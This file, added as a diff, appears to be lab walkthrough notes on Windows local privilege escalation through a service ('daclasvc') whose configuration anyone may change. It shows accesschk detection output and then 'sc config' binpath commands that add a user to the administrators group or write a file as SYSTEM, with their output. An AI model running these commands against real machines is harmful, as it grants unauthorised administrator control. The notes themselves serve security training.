@@ -1,0 +1,104 @@
+Detection - Windows VM (target)
+--------------------------------
+
+1. Use the tool 'accesschk' and the command 'sc qc' to display service permissions and service information
+
+	C:\Temp\accesschk> accesschk64.exe -wuvc daclasvc -accepteula
+
+	Accesschk v6.10 - Reports effective permissions for securable objects
+	Copyright (C) 2006-2016 Mark Russinovich
+	Sysinternals - www.sysinternals.com
+
+	daclasvc
+	  Medium Mandatory Level (Default) [No-Write-Up]
+	  RW NT AUTHORITY\SYSTEM
+		SERVICE_ALL_ACCESS
+	  RW BUILTIN\Administrators
+		SERVICE_ALL_ACCESS
+	  RW Everyone
+		SERVICE_QUERY_STATUS
+		SERVICE_QUERY_CONFIG
+		SERVICE_CHANGE_CONFIG
+		SERVICE_INTERROGATE
+		SERVICE_ENUMERATE_DEPENDENTS
+		SERVICE_START
+		SERVICE_STOP
+		READ_CONTROL
+
+
+	C:\Temp> sc qc daclasvc
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: daclasvc
+		TYPE               : 10  WIN32_OWN_PROCESS 
+		START_TYPE         : 3   DEMAND_START
+		ERROR_CONTROL      : 1   NORMAL
+		BINARY_PATH_NAME   : "C:\Program Files\Clapplication\clservice.exe"
+		LOAD_ORDER_GROUP   : 
+		TAG                : 0
+		DISPLAY_NAME       : Clapplication
+		DEPENDENCIES       : 
+		SERVICE_START_NAME : LocalSystem
+	
+2. Notice that the output suggests that 'Everyone' has the “SERVICE_CHANGE_CONFIG”, 'SERVICE_START' and 'SERVICE_STOP' permission.
+
+
+Exploitation - Windows VM (target)
+-----------------------------------
+
+1. In command prompt type (examples):
+
+	sc config daclasvc binpath= "cmd.exe /k net localgroup administrators user /add"
+	then
+	sc start daclasvc
+	then
+	net localgroup administrators
+	
+	or ----------------
+
+	C:\Temp> sc config daclasvc binpath= "cmd.exe /k echo pwned > C:\Temp\Privesc-BinPath.txt"
+	[SC] ChangeServiceConfig SUCCESS
+
+	C:\Temp> sc start daclasvc
+	sc start daclasvc
+	[SC] StartService FAILED 1053:
+
+	The service did not respond to the start or control request in a timely fashion.
+
+	C:\Temp> dir
+	dir
+	 Volume in drive C has no label.
+	 Volume Serial Number is C022-C9A0
+
+	 Directory of C:\Temp
+
+	03/26/2020  12:46 AM    <DIR>          .
+	03/26/2020  12:46 AM    <DIR>          ..
+	03/25/2020  09:43 PM    <DIR>          Accesschk
+	03/25/2020  02:44 AM    <DIR>          AccessEnum
+	03/25/2020  02:44 AM    <DIR>          Autoruns
+	03/25/2020  02:44 AM    <DIR>          DLL Export Viewer
+	03/25/2020  02:44 AM    <DIR>          PowerUp
+	03/26/2020  12:47 AM                 8 Privesc-BinPath.txt
+	03/25/2020  02:44 AM    <DIR>          ProcDump
+	03/25/2020  02:44 AM    <DIR>          Process Explorer
+	03/25/2020  02:45 AM    <DIR>          Process Monitor
+	03/25/2020  11:19 PM           320,826 program.exe
+	03/25/2020  11:20 PM           320,826 program2.exe
+	03/25/2020  01:02 AM                30 test-encode
+	03/25/2020  12:30 AM             1,608 test-encode2
+	03/25/2020  11:35 PM             1,472 test.txt
+	03/25/2020  01:05 AM             1,128 test.vbs
+	03/25/2020  11:49 PM               232 test2.txt
+		       9 File(s)        646,130 bytes
+		      10 Dir(s)   9,869,737,984 bytes free
+		      
+	C:\Temp> type Privesc-BinPath.txt
+	type Privesc-BinPath.txt
+	pwned 
+	
+	C:\Temp> cacls Privesc-BinPath.txt
+
+	C:\Temp\Privesc-3-BinPath.txt NT AUTHORITY\SYSTEM:(ID)F 
+		                      BUILTIN\Administrators:(ID)F 
+		                      BUILTIN\Users:(ID)R 
